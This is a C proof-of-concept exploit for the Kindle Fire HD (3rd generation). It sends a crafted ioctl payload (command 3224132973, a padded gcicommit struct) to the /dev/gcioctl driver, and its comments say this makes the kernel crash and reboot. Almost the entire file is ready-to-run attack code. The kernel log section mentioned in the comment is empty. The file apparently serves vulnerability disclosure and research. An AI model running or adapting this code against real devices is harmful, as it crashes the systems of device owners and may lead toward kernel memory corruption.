/*
 * This is poc of Kindle Fire HD 3rd
 * A bug in the ioctl interface of device file /dev/gcioctl causes the system crash via IOCTL 3224132973.
 * Related buggy struct name is gcicommit.
 * This Poc should run with permission to do ioctl on /dev/gcioctl.
 *
 * The fowllwing is kmsg of kernel crash infomation:
 *
 *
 */
#include <stdio.h>
#include <fcntl.h>
#include <errno.h>
#include <sys/ioctl.h>

const static char *driver = "/dev/gcioctl";
static command = 3224132973; 

int main(int argc, char **argv, char **env) {
    unsigned int payload[] = {
    0x00002020,
    0x00000002,
    0x00000002,
    0xeddad33f,
    0x41414141,
    0x41414141,
    0x41414141,
    0x41414141,
    0x41414141,
    0x41414141,
    0x41414141,
    0x41414141,
    0xf16c7d8e,
    0x96489dd1,
    0x678a12ff,
    0x69812204,
    0x41414141,
    0x41414141,
    0x41414141,
    0x41414141
    };

        int fd = 0;
        fd = open(driver, O_RDWR);
        if (fd < 0) {
            printf("Failed to open %s, with errno %d\n", driver, errno);
            system("echo 1 > /data/local/tmp/log");
            return -1;
        }

        printf("Try open %s with command 0x%x.\n", driver, command);
        printf("System will crash and reboot.\n");
        if(ioctl(fd, command, &payload) < 0) {
            printf("Allocation of structs failed, %d\n", errno);
            system("echo 2 > /data/local/tmp/log");
            return -1;
        }
        close(fd);
        return 0;
}